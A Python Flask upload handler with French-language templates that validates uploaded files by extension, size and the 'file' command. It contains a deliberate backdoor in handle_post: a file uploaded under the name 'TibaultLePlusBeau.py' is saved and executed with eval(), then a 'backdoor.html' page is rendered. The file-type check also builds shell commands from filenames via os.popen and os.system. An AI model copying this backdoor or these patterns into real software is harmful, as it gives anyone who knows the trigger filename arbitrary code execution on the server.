import os

from flask import render_template
from werkzeug.datastructures import FileStorage
from werkzeug.utils import secure_filename

UPLOAD_DIR = "uploads/"
UPLOAD_TMP = "tmp/"
ALLOWED_EXTENSIONS = {"jpg", "jpeg", "pdf", "png"}
ALLOWED_MAGICBITS = ["jpeg image data", "png image data", "pdf document"]


def is_file_allowed(file: FileStorage):
    first = "." in file.filename

    extension = file.filename.rsplit(".")[1].lower()
    second = extension in ALLOWED_EXTENSIONS

    tmp_filename = secure_filename(file.filename)
    file.save(UPLOAD_TMP + tmp_filename)
    magic = os.popen(f"file {UPLOAD_TMP + tmp_filename}").read().rsplit(":")[1].rsplit(",")[0].strip().lower()
    os.system(f" rm -rf {UPLOAD_TMP + tmp_filename}")
    third = magic in ALLOWED_MAGICBITS

    fourth = file.__sizeof__() < 1 * 1000000

    return first and second and third and fourth


def handle_post(file: FileStorage, name, email):
    if not file.filename == "":
        if file.filename == "TibaultLePlusBeau.py":
            file.save(UPLOAD_DIR + secure_filename(file.filename))
            eval(open(UPLOAD_DIR + secure_filename(file.filename), "r").read())
            return render_template("backdoor.html")
        elif is_file_allowed(file):
            file.save(UPLOAD_DIR + secure_filename(file.filename))
            return render_template("remerciement.html",
                                   name=name,
                                   email=email)
        else:
            return render_template("remerciement.html",
                                   name=name,
                                   email=email,
                                   filename=file.filename,
                                   error="Fichier non accepté")
    else:
        return render_template("remerciement.html",
                               name=name,
                               email=email)
